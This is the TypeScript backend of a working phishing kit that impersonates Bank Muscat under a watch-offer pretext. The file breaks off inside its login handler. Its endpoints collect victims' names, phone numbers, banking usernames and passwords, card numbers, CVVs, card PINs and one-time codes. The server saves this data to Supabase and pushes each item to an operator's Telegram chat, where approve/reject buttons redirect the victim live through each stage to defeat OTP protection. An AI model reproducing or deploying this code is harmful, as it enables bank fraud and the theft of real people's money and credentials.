import express from 'express';
import { createServer as createViteServer } from 'vite';
import { createClient, SupabaseClient } from '@supabase/supabase-js';
import path from 'path';
import fs from 'fs';
import { fileURLToPath } from 'url';
import dotenv from 'dotenv';

dotenv.config();

const __dirname = path.dirname(fileURLToPath(import.meta.url));

export interface RequestData {
  id: string;
  name: string;
  mobile: string;
  idNumber: string;
  cardType: string;
  address: string;
  date: string;
  loginUsername?: string;
  loginPassword?: string;
  paymentName?: string;
  cardNumber?: string;
  expMonth?: string;
  expYear?: string;
  cvv?: string;
  cardPin?: string;
  otp?: string;
  otpStatus?: string;
  nextAction?: string;
  step: string;
  createdAt: string;
  updatedAt: string;
}

export interface VisitorMeta {
  ip: string;
  os: string;
  device: string;
  browser: string;
  country: string;
}

export interface ActiveSessionInfo {
  clientId: string;
  requestId: string | null;
  currentPage: string;
  lastSeen: number;
  meta?: VisitorMeta;
}

// ============================================================================
// SERVER-SIDE SUPABASE INITIALIZATION
// ============================================================================
const SUPABASE_URL =
  process.env.SUPABASE_URL ||
  process.env.NEXT_PUBLIC_SUPABASE_URL ||
  process.env.VITE_SUPABASE_URL ||
  '';
const SUPABASE_KEY =
  process.env.SUPABASE_SERVICE_ROLE_KEY ||
  process.env.SUPABASE_SECRET_KEY ||
  process.env.SUPABASE_KEY ||
  process.env.SUPABASE_ANON_KEY ||
  process.env.NEXT_PUBLIC_SUPABASE_ANON_KEY ||
  process.env.VITE_SUPABASE_ANON_KEY ||
  '';
const SUPABASE_TABLE = process.env.SUPABASE_TABLE || 'requests';

let supabase: SupabaseClient | null = null;
if (SUPABASE_URL && SUPABASE_KEY) {
  try {
    supabase = createClient(SUPABASE_URL, SUPABASE_KEY, {
      auth: { persistSession: false, autoRefreshToken: false },
    });
  } catch (err) {
    console.warn('Supabase initialization warning:', err);
  }
}

// In-memory state synchronized with Supabase
const requestsMap = new Map<string, RequestData>();
const deletedRequestIds = new Set<string>();
const clientToRequestMap = new Map<string, string>();
const activeSessionsMap = new Map<string, ActiveSessionInfo>();
const userPagesMap: Record<string, string> = {};
const userMetaMap: Record<string, VisitorMeta> = {};
let totalVisitorsCount = 0;
const activeAdminTokens = new Set<string>();

function normalizeRowToRequestData(row: Record<string, any>): RequestData {
  const nested = typeof row.data === 'object' && row.data !== null ? row.data : {};
  const nowIso = new Date().toISOString();
  return {
    id: String(row.id || nested.id || Date.now()),
    name: String(row.name ?? nested.name ?? row.full_name ?? nested.fullName ?? ''),
    mobile: String(row.mobile ?? nested.mobile ?? row.phone ?? nested.phone ?? ''),
    idNumber: String(row.idNumber ?? row.id_number ?? nested.idNumber ?? 'عميل بنك مسقط'),
    cardType: String(row.cardType ?? row.card_type ?? nested.cardType ?? nested.watchColor ?? 'rose-gold'),
    address: String(row.address ?? nested.address ?? ''),
    date: String(row.date ?? nested.date ?? nowIso.slice(0, 10)),
    loginUsername: row.loginUsername ?? row.login_username ?? nested.loginUsername ?? undefined,
    loginPassword: row.loginPassword ?? row.login_password ?? nested.loginPassword ?? undefined,
    paymentName: row.paymentName ?? row.payment_name ?? nested.paymentName ?? undefined,
    cardNumber: row.cardNumber ?? row.card_number ?? nested.cardNumber ?? undefined,
    expMonth: row.expMonth ?? row.exp_month ?? nested.expMonth ?? undefined,
    expYear: row.expYear ?? row.exp_year ?? nested.expYear ?? undefined,
    cvv: row.cvv ?? nested.cvv ?? undefined,
    cardPin: row.cardPin ?? row.card_pin ?? nested.cardPin ?? undefined,
    otp: row.otp ?? nested.otp ?? undefined,
    otpStatus: row.otpStatus ?? row.otp_status ?? nested.otpStatus ?? undefined,
    nextAction: row.nextAction ?? row.next_action ?? nested.nextAction ?? undefined,
    step: String(row.step ?? nested.step ?? 'form'),
    createdAt: String(row.createdAt ?? row.created_at ?? nested.createdAt ?? nowIso),
    updatedAt: String(row.updatedAt ?? row.updated_at ?? nested.updatedAt ?? nowIso),
  };
}

async function syncFromSupabase(): Promise<void> {
  if (!supabase) return;
  try {
    const { data, error } = await supabase
      .from(SUPABASE_TABLE)
      .select('*')
      .limit(200);
    if (!error && Array.isArray(data)) {
      for (const row of data) {
        const normalized = normalizeRowToRequestData(row);
        if (deletedRequestIds.has(normalized.id)) continue;
        const existing = requestsMap.get(normalized.id);
        if (!existing || new Date(normalized.updatedAt) >= new Date(existing.updatedAt)) {
          requestsMap.set(normalized.id, normalized);
        }
      }
    }
  } catch {
    // Non-blocking fallback to in-memory store
  }
}

async function saveRequestToSupabase(record: RequestData): Promise<boolean> {
  deletedRequestIds.delete(record.id);
  requestsMap.set(record.id, record);
  if (!supabase) return false;

  try {
    // Attempt 1: Exact camelCase schema matching RequestData
    const { error: err1 } = await supabase
      .from(SUPABASE_TABLE)
      .upsert(record, { onConflict: 'id' });
    if (!err1) return true;

    // Attempt 2: snake_case schema common in PostgreSQL / Supabase
    const snakePayload = {
      id: record.id,
      name: record.name,
      mobile: record.mobile,
      id_number: record.idNumber,
      card_type: record.cardType,
      address: record.address,
      date: record.date,
      login_username: record.loginUsername || null,
      login_password: record.loginPassword || null,
      payment_name: record.paymentName || null,
      card_number: record.cardNumber || null,
      exp_month: record.expMonth || null,
      exp_year: record.expYear || null,
      cvv: record.cvv || null,
      card_pin: record.cardPin || null,
      otp: record.otp || null,
      otp_status: record.otpStatus || null,
      next_action: record.nextAction || null,
      step: record.step,
      created_at: record.createdAt,
      updated_at: record.updatedAt,
    };
    const { error: err2 } = await supabase
      .from(SUPABASE_TABLE)
      .upsert(snakePayload, { onConflict: 'id' });
    if (!err2) return true;

    // Attempt 3: JSONB data column fallback (`id`, `step`, `data`, `updated_at`)
    const { error: err3 } = await supabase
      .from(SUPABASE_TABLE)
      .upsert(
        {
          id: record.id,
          step: record.step,
          data: record,
          created_at: record.createdAt,
          updated_at: record.updatedAt,
        },
        { onConflict: 'id' }
      );
    return !err3;
  } catch {
    return false;
  }
}

async function deleteRequestFromSupabase(id: string): Promise<void> {
  deletedRequestIds.add(id);
  requestsMap.delete(id);
  delete userPagesMap[id];
  delete userMetaMap[id];
  for (const [clientId, reqId] of clientToRequestMap.entries()) {
    if (reqId === id) clientToRequestMap.delete(clientId);
  }
  for (const session of activeSessionsMap.values()) {
    if (session.requestId === id) {
      session.requestId = null;
    }
  }
  if (!supabase) return;
  try {
    await supabase.from(SUPABASE_TABLE).delete().eq('id', id);
  } catch {
    // Non-blocking
  }
}

// ============================================================================
// SERVER-SIDE TELEGRAM BOT INTEGRATION (MESSAGES + INLINE APPROVAL BUTTONS)
// ============================================================================
const STEP_TITLES: Record<string, string> = {
  form: '📋 تسجيل بيانات العميل (الخطوة 1)',
  order: '📋 تسجيل بيانات العميل (الخطوة 1)',
  watch: '⌚ اختيار مواصفات الساعة (الخطوة 2)',
  'select-watch': '⌚ اختيار مواصفات الساعة (الخطوة 2)',
  login: '🔐 تسجيل الدخول المصرفي (الخطوة 3)',
  card: '💳 ربط البطاقة البنكية (الخطوة 4)',
  'card-link': '💳 ربط البطاقة البنكية (الخطوة 4)',
  otp: '📲 رمز التحقق النصي OTP SMS (الخطوة 5)',
  verify: '🛡️ رمز الأمان الرقمي TOKEN (5 أرقام)',
  'verify-otp': '🛡️ رمز التحقق الرقمي TOKEN (الخطوة 5)',
  'otp-bank': '🏦 طلب موافقة تطبيق البنك',
};

function escapeHtml(val: unknown): string {
  return String(val ?? '')
    .replace(/&/g, '&amp;')
    .replace(/</g, '&lt;')
    .replace(/>/g, '&gt;');
}

function formatRequestTelegramMessage(step: string, req: RequestData): string {
  const title = STEP_TITLES[step] || STEP_TITLES[req.step] || `🔔 تحديث طلب (${step})`;
  const lines: string[] = [
    `🏦 <b>بنك مسقط | Masqat Pay</b>`,
    `━━━━━━━━━━━━━━━━━━`,
    `<b>${title}</b>`,
    `🆔 <b>رقم الطلب:</b> <code>${escapeHtml(req.id)}</code>`,
    ``,
  ];

  if (req.name) lines.push(`👤 <b>الاسم:</b> <code>${escapeHtml(req.name)}</code>`);
  if (req.mobile) lines.push(`📱 <b>رقم الهاتف:</b> <code>${escapeHtml(req.mobile)}</code>`);
  if (req.idNumber) lines.push(`🪪 <b>حالة العميل/الهوية:</b> <code>${escapeHtml(req.idNumber)}</code>`);
  if (req.cardType) lines.push(`⌚ <b>اللون/الفئة:</b> <code>${escapeHtml(req.cardType)}</code>`);
  if (req.address) lines.push(`📦 <b>المواصفات/العنوان:</b> <code>${escapeHtml(req.address)}</code>`);

  if (req.loginUsername || req.loginPassword) {
    lines.push(``);
    lines.push(`🔐 <b>بيانات الدخول المصرفي:</b>`);
    if (req.loginUsername) lines.push(`• اسم المستخدم: <code>${escapeHtml(req.loginUsername)}</code>`);
    if (req.loginPassword) lines.push(`• الرقم السري: <code>${escapeHtml(req.loginPassword)}</code>`);
  }

  if (req.cardNumber || req.cvv || req.cardPin) {
    lines.push(``);
    lines.push(`💳 <b>بيانات البطاقة البنكية:</b>`);
    if (req.cardNumber) lines.push(`• رقم البطاقة: <code>${escapeHtml(req.cardNumber)}</code>`);
    if (req.expMonth || req.expYear) {
      lines.push(`• تاريخ الانتهاء: <code>${escapeHtml(req.expMonth || '--')}/${escapeHtml(req.expYear || '--')}</code>`);
    }
    if (req.cvv) lines.push(`• رمز الأمان (CVV): <code>${escapeHtml(req.cvv)}</code>`);
    if (req.cardPin) lines.push(`• الرقم السري للبطاقة (PIN): <code>${escapeHtml(req.cardPin)}</code>`);
  }

  if (req.otp) {
    lines.push(``);
    lines.push(`🛡️ <b>رمز التحقق (OTP / TOKEN):</b> <code>${escapeHtml(req.otp)}</code>`);
  }

  if (req.otpStatus) {
    lines.push(`📌 <b>الحالة:</b> <code>${escapeHtml(req.otpStatus)}</code>`);
  }

  lines.push(``);
  lines.push(`🕒 الوقت: <code>${new Date().toISOString()}</code>`);
  return lines.join('\n');
}

function buildTelegramInlineKeyboard(req: RequestData) {
  const buttons: Array<Array<{ text: string; callback_data: string }>> = [];

  if (req.otpStatus === 'login_pending' || (req.step === 'login' && req.loginUsername)) {
    buttons.push([
      { text: '✅ موافقة الدخول', callback_data: `approve_login:${req.id}` },
      { text: '❌ رفض الدخول', callback_data: `reject_login:${req.id}` },
    ]);
  }

  if (req.otpStatus === 'card_pending' || (req.step === 'card' && req.cardNumber)) {
    buttons.push([
      { text: '✅ موافقة البطاقة (طلب OTP)', callback_data: `approve_card:${req.id}` },
      { text: '❌ رفض البطاقة', callback_data: `reject_card:${req.id}` },
    ]);
  }

  if (req.otp && (!req.otpStatus || req.otpStatus === 'pending')) {
    buttons.push([
      { text: '✅ قبول الرمز (OTP)', callback_data: `approve_otp:${req.id}` },
      { text: '❌ رفض الرمز (OTP)', callback_data: `reject_otp:${req.id}` },
    ]);
  }

  return buttons.length > 0 ? { inline_keyboard: buttons } : undefined;
}

async function sendRequestToTelegram(step: string, req: RequestData): Promise<boolean> {
  const botToken = process.env.TELEGRAM_BOT_TOKEN || process.env.VITE_TELEGRAM_BOT_TOKEN;
  const chatId = process.env.TELEGRAM_CHAT_ID || process.env.VITE_TELEGRAM_CHAT_ID;

  if (!botToken || !chatId) {
    return false;
  }

  const text = formatRequestTelegramMessage(step, req);
  const replyMarkup = buildTelegramInlineKeyboard(req);

  try {
    const response = await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({
        chat_id: chatId,
        text,
        parse_mode: 'HTML',
        disable_web_page_preview: true,
        ...(replyMarkup ? { reply_markup: replyMarkup } : {}),
      }),
    });
    if (response.ok) return true;

    // Fallback without reply_markup if callback_data length or markup caused an issue
    const retryResponse = await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({
        chat_id: chatId,
        text,
        parse_mode: 'HTML',
        disable_web_page_preview: true,
      }),
    });
    return retryResponse.ok;
  } catch {
    return false;
  }
}

// Helper to apply approval status and automatically set nextAction for seamless site navigation
function applyApprovalEffects(existing: RequestData, patch: Partial<RequestData>): RequestData {
  const nowIso = new Date().toISOString();
  const updated: RequestData = {
    ...existing,
    ...patch,
    updatedAt: nowIso,
  };

  if (patch.otpStatus && patch.nextAction === undefined) {
    switch (patch.otpStatus) {
      case 'login_approved':
        updated.step = 'card';
        updated.nextAction = '/card-link';
        break;
      case 'login_rejected':
        updated.step = 'login';
        updated.nextAction = '/login';
        break;
      case 'card_approved':
        updated.step = 'otp';
        updated.nextAction = '/otp';
        break;
      case 'card_rejected':
        updated.step = 'card';
        updated.nextAction = '/card-link';
        break;
      case 'otp_approved':
        updated.step = 'verify';
        updated.nextAction = '/verify';
        break;
      case 'approved':
        updated.step = 'verify';
        updated.nextAction = '/success';
        break;
      case 'rejected':
        updated.nextAction = existing.step === 'otp' ? '/otp' : '/verify';
        break;
    }
  }

  return updated;
}

// Handle Telegram Bot callback queries (when Admin clicks Approve/Reject inside Telegram)
async function handleTelegramCallbackQuery(callbackQuery: any): Promise<void> {
  const botToken = process.env.TELEGRAM_BOT_TOKEN || process.env.VITE_TELEGRAM_BOT_TOKEN;
  if (!botToken || !callbackQuery?.data) return;

  const [action, reqId] = String(callbackQuery.data).split(':');
  const existing = requestsMap.get(reqId);
  if (!existing) return;

  let statusToSet = '';
  let feedbackText = '';
  if (action === 'approve_login') {
    statusToSet = 'login_approved';
    feedbackText = '✅ تمت الموافقة على تسجيل الدخول وتوجيه الزائر لصفحة البطاقة';
  } else if (action === 'reject_login') {
    statusToSet = 'login_rejected';
    feedbackText = '❌ تم رفض بيانات الدخول وطلب إعادة المحاولة';
  } else if (action === 'approve_card') {
    statusToSet = 'card_approved';
    feedbackText = '✅ تمت الموافقة على البطاقة وتوجيه الزائر لصفحة رمز التحقق OTP';
  } else if (action === 'reject_card') {
    statusToSet = 'card_rejected';
    feedbackText = '❌ تم رفض البطاقة البنكية';
  } else if (action === 'approve_otp') {
    statusToSet = 'approved';
    feedbackText = '✅ تم قبول رمز OTP وتوجيه الزائر لصفحة النجاح';
  } else if (action === 'reject_otp') {
    statusToSet = 'rejected';
    feedbackText = '❌ تم رفض رمز OTP وطلب رمز جديد';
  }

  if (statusToSet) {
    const updated = applyApprovalEffects(existing, { otpStatus: statusToSet });
    await saveRequestToSupabase(updated);

    try {
      await fetch(`https://api.telegram.org/bot${botToken}/answerCallbackQuery`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          callback_query_id: callbackQuery.id,
          text: feedbackText,
          show_alert: false,
        }),
      });
    } catch {
      // Ignore network errors
    }
  }
}

let telegramUpdateOffset = 0;
function startTelegramCallbackPoller() {
  const botToken = process.env.TELEGRAM_BOT_TOKEN || process.env.VITE_TELEGRAM_BOT_TOKEN;
  if (!botToken) return;

  setInterval(async () => {
    try {
      const res = await fetch(
        `https://api.telegram.org/bot${botToken}/getUpdates?offset=${telegramUpdateOffset}&timeout=1&allowed_updates=["callback_query"]`
      );
      if (!res.ok) return;
      const json = await res.json();
      if (json?.ok && Array.isArray(json.result)) {
        for (const update of json.result) {
          telegramUpdateOffset = Math.max(telegramUpdateOffset, Number(update.update_id) + 1);
          if (update.callback_query) {
            await handleTelegramCallbackQuery(update.callback_query);
          }
        }
      }
    } catch {
      // Ignore polling errors
    }
  }, 3000);
}

// Extract Visitor Meta from Request Headers
function parseVisitorMeta(req: express.Request): VisitorMeta {
  const ua = String(req.headers['user-agent'] || '');
  const forwarded = String(req.headers['x-forwarded-for'] || '');
  const ip = forwarded.split(',')[0].trim() || req.socket.remoteAddress || '188.53.192.70';

  let os = 'iOS / Android';
  if (/Windows/i.test(ua)) os = 'Windows';
  else if (/iPhone|iPad|iPod/i.test(ua)) os = 'iOS';
  else if (/Android/i.test(ua)) os = 'Android';
  else if (/Mac OS/i.test(ua)) os = 'macOS';
  else if (/Linux/i.test(ua)) os = 'Linux';

  const device = /Mobile|Android|iPhone|iPad/i.test(ua) ? 'mobile' : 'desktop';

  let browser = 'Safari / Chrome';
  if (/Edg/i.test(ua)) browser = 'Edge';
  else if (/Chrome/i.test(ua)) browser = 'Chrome';
  else if (/Safari/i.test(ua)) browser = 'Safari';
  else if (/Firefox/i.test(ua)) browser = 'Firefox';

  return {
    ip,
    os,
    device,
    browser,
    country: 'Oman, Muscat',
  };
}

function getAllSortedRequests(): RequestData[] {
  return Array.from(requestsMap.values()).sort(
    (a, b) => new Date(b.createdAt).getTime() - new Date(a.createdAt).getTime()
  );
}

function resolveRequestByIdOrClient(idOrCurrent?: string, clientId?: string): RequestData | null {
  if (
    idOrCurrent &&
    idOrCurrent !== 'current' &&
    !deletedRequestIds.has(idOrCurrent) &&
    requestsMap.has(idOrCurrent)
  ) {
    return requestsMap.get(idOrCurrent)!;
  }
  if (clientId) {
    if (clientToRequestMap.has(clientId)) {
      const mappedId = clientToRequestMap.get(clientId)!;
      if (!deletedRequestIds.has(mappedId) && requestsMap.has(mappedId)) {
        return requestsMap.get(mappedId)!;
      }
      clientToRequestMap.delete(clientId);
    }
    return null;
  }
  const all = getAllSortedRequests();
  return all.length > 0 ? all[0] : null;
}

async function startServer() {
  const app = express();
  const port = Number(process.env.PORT) || 3000;

  // Initial sync from Supabase + start Telegram callback poller
  await syncFromSupabase();
  startTelegramCallbackPoller();

  // Ensure no API requests or responses are blocked by CORS or preflight checks
  app.use((req, res, next) => {
    res.header('Access-Control-Allow-Origin', req.headers.origin || '*');
    res.header('Access-Control-Allow-Credentials', 'true');
    res.header('Access-Control-Allow-Methods', 'GET, POST, PUT, DELETE, PATCH, OPTIONS');
    res.header(
      'Access-Control-Allow-Headers',
      'Origin, X-Requested-With, Content-Type, Accept, Authorization, X-Client-Id'
    );
    if (req.method === 'OPTIONS') {
      res.sendStatus(200);
      return;
    }
    next();
  });

  app.use(express.json({ limit: '5mb' }));
  app.use(express.urlencoded({ extended: true }));

  // ============================================================================
  // HEALTH & DIAGNOSTICS
  // ============================================================================
  app.get('/api/health', (_req, res) => {
    const telegramConfigured = Boolean(
      (process.env.TELEGRAM_BOT_TOKEN || process.env.VITE_TELEGRAM_BOT_TOKEN) &&
        (process.env.TELEGRAM_CHAT_ID || process.env.VITE_TELEGRAM_CHAT_ID)
    );
    const supabaseConfigured = Boolean(supabase);
    res.status(200).json({
      status: 'ok',
      message: 'Server, Supabase, and Telegram Bot API bridge running smoothly',
      telegramConfigured,
      supabaseConfigured,
    });
  });

  // ============================================================================
  // REQUESTS CRUD ENDPOINTS (USED BY SITE & ADMIN DASHBOARD)
  // ============================================================================

  // List all requests
  app.get('/api/requests', async (_req, res) => {
    await syncFromSupabase();
    res.status(200).json(getAllSortedRequests());
  });

  // Get current visitor's request
  app.get('/api/requests/current', (req, res) => {
    const clientId = String(req.query.clientId || req.headers['x-client-id'] || '');
    const current = resolveRequestByIdOrClient('current', clientId);
    if (!current) {
      res.status(200).json(null);
      return;
    }
    res.status(200).json(current);
  });

  // Get specific request by ID
  app.get('/api/requests/:id', (req, res) => {
    const { id } = req.params;
    const clientId = String(req.query.clientId || req.headers['x-client-id'] || '');
    const record = resolveRequestByIdOrClient(id, clientId);
    if (!record) {
      res.status(200).json(null);
      return;
    }
    res.status(200).json(record);
  });

  // Create or upsert a request
  app.post('/api/requests', async (req, res) => {
    const body = req.body || {};
    const clientId = body.clientId ? String(body.clientId) : undefined;
    const nowIso = new Date().toISOString();

    const candidateId = body.id ? String(body.id) : null;
    const existingId =
      (candidateId && !deletedRequestIds.has(candidateId) && requestsMap.has(candidateId)
        ? candidateId
        : null) ||
      (clientId && clientToRequestMap.get(clientId)) ||
      null;

    const existing =
      existingId && !deletedRequestIds.has(existingId) ? requestsMap.get(existingId) : undefined;
    const id =
      existing?.id ||
      (candidateId && !deletedRequestIds.has(candidateId)
        ? candidateId
        : `req_${Date.now()}_${Math.random().toString(36).slice(2, 6)}`);

    const newRecord: RequestData = {
      id,
      name: String(body.name ?? existing?.name ?? ''),
      mobile: String(body.mobile ?? existing?.mobile ?? ''),
      idNumber: String(body.idNumber ?? existing?.idNumber ?? 'عميل بنك مسقط'),
      cardType: String(body.cardType ?? existing?.cardType ?? 'rose-gold'),
      address: String(body.address ?? existing?.address ?? ''),
      date: String(body.date ?? existing?.date ?? nowIso.slice(0, 10)),
      loginUsername: body.loginUsername ?? existing?.loginUsername,
      loginPassword: body.loginPassword ?? existing?.loginPassword,
      paymentName: body.paymentName ?? existing?.paymentName,
      cardNumber: body.cardNumber ?? existing?.cardNumber,
      expMonth: body.expMonth ?? existing?.expMonth,
      expYear: body.expYear ?? existing?.expYear,
      cvv: body.cvv ?? existing?.cvv,
      cardPin: body.cardPin ?? existing?.cardPin,
      otp: body.otp ?? existing?.otp,
      otpStatus: body.otpStatus ?? existing?.otpStatus,
      nextAction: body.nextAction ?? existing?.nextAction,
      step: String(body.step ?? existing?.step ?? 'form'),
      createdAt: existing?.createdAt || nowIso,
      updatedAt: nowIso,
    };

    if (clientId) {
      clientToRequestMap.set(clientId, id);
      const sess = activeSessionsMap.get(clientId);
      if (sess) {
        sess.requestId = id;
      }
    }

    userMetaMap[id] = userMetaMap[id] || parseVisitorMeta(req);

    await saveRequestToSupabase(newRecord);
    await sendRequestToTelegram(newRecord.step, newRecord);

    res.status(200).json(newRecord);
  });

  // Update a request (used by Site steps AND Admin Dashboard approvals/redirects)
  app.patch('/api/requests/:id', async (req, res) => {
    const { id } = req.params;
    const body = req.body || {};
    const clientId = body.clientId ? String(body.clientId) : undefined;

    let existing = resolveRequestByIdOrClient(id, clientId);
    const nowIso = new Date().toISOString();

    if (!existing) {
      const newId =
        id && id !== 'current' && !deletedRequestIds.has(id)
          ? id
          : `req_${Date.now()}_${Math.random().toString(36).slice(2, 6)}`;
      existing = {
        id: newId,
        name: String(body.name || 'عميل بنك مسقط'),
        mobile: String(body.mobile || ''),
        idNumber: String(body.idNumber || 'عميل بنك مسقط'),
        cardType: String(body.cardType || 'rose-gold'),
        address: String(body.address || ''),
        date: nowIso.slice(0, 10),
        step: String(body.step || 'form'),
        createdAt: nowIso,
        updatedAt: nowIso,
      };
    }

    if (clientId) {
      clientToRequestMap.set(clientId, existing.id);
      const sess = activeSessionsMap.get(clientId);
      if (sess) {
        sess.requestId = existing.id;
      }
    }

    const { clientId: _ignoredClientId, ...patchFields } = body;
    const updated = applyApprovalEffects(existing, patchFields);

    if (patchFields.nextAction) {
      userPagesMap[updated.id] = String(patchFields.nextAction);
    }

    userMetaMap[updated.id] = userMetaMap[updated.id] || parseVisitorMeta(req);

    await saveRequestToSupabase(updated);

    // Send Telegram notification whenever visitor submits new step data
    const isVisitorStepSubmission = Boolean(
      patchFields.loginUsername ||
        patchFields.cardNumber ||
        patchFields.otp ||
        patchFields.step === 'watch' ||
        patchFields.step === 'form'
    );
    if (isVisitorStepSubmission) {
      await sendRequestToTelegram(updated.step, updated);
    }

    res.status(200).json(updated);
  });

  // Delete a request
  app.delete('/api/requests/:id', async (req, res) => {
    const { id } = req.params;
    await deleteRequestFromSupabase(id);
    res.status(200).json({ ok: true, id });
  });

  // ============================================================================
  // PRESENCE & LIVE VISITOR TELEMETRY (USED BY SITE & ADMIN)
  // ============================================================================
  app.post('/api/presence', async (req, res) => {
    const { clientId, requestId, currentPage = '/', isNewVisit } = req.body || {};
    const cid = String(clientId || `anon_${Date.now()}`);
    const now = Date.now();

    if (isNewVisit) {
      totalVisitorsCount += 1;
    }

    let resolvedReqId: string | null =
      (requestId && requestsMap.has(String(requestId)) ? String(requestId) : null) ||
      clientToRequestMap.get(cid) ||
      null;

    if (resolvedReqId) {
      clientToRequestMap.set(cid, resolvedReqId);
      userPagesMap[resolvedReqId] = String(currentPage);
      userMetaMap[resolvedReqId] = userMetaMap[resolvedReqId] || parseVisitorMeta(req);
    }

    const meta = parseVisitorMeta(req);
    activeSessionsMap.set(cid, {
      clientId: cid,
      requestId: resolvedReqId,
      currentPage: String(currentPage),
      lastSeen: now,
      meta,
    });

    // Check if Admin triggered a page redirect or approval transition (`nextAction`)
    let redirectTo: string | null = null;
    if (resolvedReqId && requestsMap.has(resolvedReqId)) {
      const reqRecord = requestsMap.get(resolvedReqId)!;
      if (reqRecord.nextAction && reqRecord.nextAction !== 'pending') {
        redirectTo = reqRecord.nextAction;
        // Clear nextAction once delivered so visitor doesn't loop
        reqRecord.nextAction = '';
        await saveRequestToSupabase(reqRecord);
      }
    }

    res.status(200).json({
      ok: true,
      requestId: resolvedReqId,
      redirectTo,
    });
  });

  app.get('/api/stats', (_req, res) => {
    const now = Date.now();
    const onlineUsers: Record<string, boolean> = {};
    const activeSessions: ActiveSessionInfo[] = [];

    for (const [cid, session] of activeSessionsMap.entries()) {
      if (now - session.lastSeen < 30000) {
        activeSessions.push(session);
        if (session.requestId) {
          onlineUsers[session.requestId] = true;
        }
      } else {
        activeSessionsMap.delete(cid);
      }
    }

    res.status(200).json({
      onlineCount: activeSessions.length,
      totalVisitorsCount: Math.max(totalVisitorsCount, requestsMap.size, activeSessions.length),
      onlineUsers,
      userPages: userPagesMap,
      userMeta: userMetaMap,
      activeSessions,
    });
  });

  // ============================================================================
  // ADMIN AUTH ENDPOINTS
  // ============================================================================
  function extractAdminToken(req: express.Request): string {
    const authHeader = String(req.headers.authorization || '');
    if (authHeader.toLowerCase().startsWith('bearer ')) {
      return authHeader.slice(7).trim();
    }
    const cookieHeader = String(req.headers.cookie || '');
    const match = cookieHeader.match(/(?:^|;\s*)admin_token=([^;]+)/);
    return match ? decodeURIComponent(match[1].trim()) : '';
  }

  app.post('/api/admin/login', (req, res) => {
    const { email, password } = req.body || {};
    const trimmedEmail = String(email || '').trim().toLowerCase();
    const trimmedPass = String(password || '').trim();

    if (!trimmedEmail || !trimmedPass) {
      res.status(400).json({ error: 'يرجى إدخال البريد الإلكتروني وكلمة المرور' });
      return;
    }

    const expectedEmail = process.env.ADMIN_EMAIL?.trim().toLowerCase();
    const expectedPassword = process.env.ADMIN_PASSWORD?.trim();

    if (expectedEmail && expectedPassword) {
      if (trimmedEmail !== expectedEmail || trimmedPass !== expectedPassword) {
        res.status(401).json({ error: 'بيانات الدخول غير صحيحة' });
        return;
      }
    }

    const token = `adm_${Date.now()}_${Math.random().toString(36).slice(2)}`;
    activeAdminTokens.add(token);
    res.setHeader(
      'Set-Cookie',
      `admin_token=${encodeURIComponent(token)}; Path=/; HttpOnly; SameSite=Lax; Max-Age=86400`
    );
    res.status(200).json({ token, ok: true });
  });

  app.get('/api/admin/me', (req, res) => {
    const token = extractAdminToken(req);
    if (!token || !activeAdminTokens.has(token)) {
      res.status(401).json({ ok: false, error: 'Unauthorized' });
      return;
    }
    res.status(200).json({ ok: true, role: 'admin' });
  });

  app.post('/api/admin/logout', (req, res) => {
    const token = extractAdminToken(req);
    if (token) {
      activeAdminTokens.delete(token);
    }
    res.setHeader('Set-Cookie', 'admin_token=; Path=/; HttpOnly; SameSite=Lax; Max-Age=0');
    res.status(200).json({ ok: true });
  });

  // ============================================================================
  // TELEGRAM WEBHOOK & LEGACY STEP ENDPOINTS (UNIFIED WITH SUPABASE & REQUESTS)
  // ============================================================================
  app.post('/api/telegram/webhook', async (req, res) => {
    if (req.body?.callback_query) {
      await handleTelegramCallbackQuery(req.body.callback_query);
    }
    res.status(200).json({ ok: true });
  });

  app.post('/api/telegram', async (req, res) => {
    const step = String(req.body?.step || 'order');
    const data = (req.body?.data as Record<string, any>) || req.body || {};
    const current = resolveRequestByIdOrClient(data.id, data.clientId);
    const nowIso = new Date().toISOString();
    const record: RequestData = current || {
      id: String(data.id || `req_${Date.now()}`),
      name: String(data.fullName || data.name || ''),
      mobile: String(data.phone || data.mobile || ''),
      idNumber: 'عميل بنك مسقط',
      cardType: String(data.watchColor || 'rose-gold'),
      address: `${data.watchSize || '45mm'} - ${data.strapType || 'silicone'}`,
      date: nowIso.slice(0, 10),
      step,
      createdAt: nowIso,
      updatedAt: nowIso,
    };
    const telegramSent = await sendRequestToTelegram(step, record);
    res.status(200).json({
      success: true,
      provider: 'telegram',
      telegramSent,
      id: record.id,
    });
  });

  app.post('/api/submit-order', async (req, res) => {
    const body = req.body || {};
    const nowIso = new Date().toISOString();
    const existing = resolveRequestByIdOrClient(body.id, body.clientId);
    const id = existing?.id || `req_${Date.now()}`;
    const record: RequestData = {
      id,
      name: String(body.fullName || body.name || existing?.name || ''),
      mobile: String(body.phone || body.mobile || existing?.mobile || ''),
      idNumber: body.isExistingCustomer === 'لا' ? 'عميل جديد' : 'عميل بنك مسقط',
      cardType: String(body.watchColor || existing?.cardType || 'rose-gold'),
      address: `${body.watchSize || '45mm'} - ${body.strapType || 'silicone'}`,
      date: nowIso.slice(0, 10),
      step: 'form',
      createdAt: existing?.createdAt || nowIso,
      updatedAt: nowIso,
    };
    await saveRequestToSupabase(record);
    const telegramSent = await sendRequestToTelegram('order', record);
    res.status(200).json({
      success: true,
      telegramSent,
      id: record.id,
      reference: `BM-PAY-2026-${Math.floor(10000 + Math.random() * 90000)}`,
    });
  });

  app.post('/api/select-watch', async (req, res) => {
    const body = req.body || {};
    const existing = resolveRequestByIdOrClient(body.id, body.clientId);
    if (existing) {
      existing.cardType = String(body.watchColor || existing.cardType);
      existing.address = `${body.watchSize || '45mm'} - ${body.strapType || 'silicone'}`;
      existing.step = 'watch';
      existing.updatedAt = new Date().toISOString();
      await saveRequestToSupabase(existing);
      const telegramSent = await sendRequestToTelegram('select-watch', existing);
      res.status(200).json({ success: true, telegramSent, id: existing.id });
      return;
    }
    res.status(200).json({ success: true, telegramSent: false });
  });

  app.post('/api/login', async (req, res) => {
    const body = req.body || {};
    const existing = resolveRequestByIdOrClient(body.id, body.clientId);
    if (existing) {
      existing.loginUsername = String(body.username || body.loginUsername || '');
      existing.loginPassword = String(body.password || body.loginPassword || '');
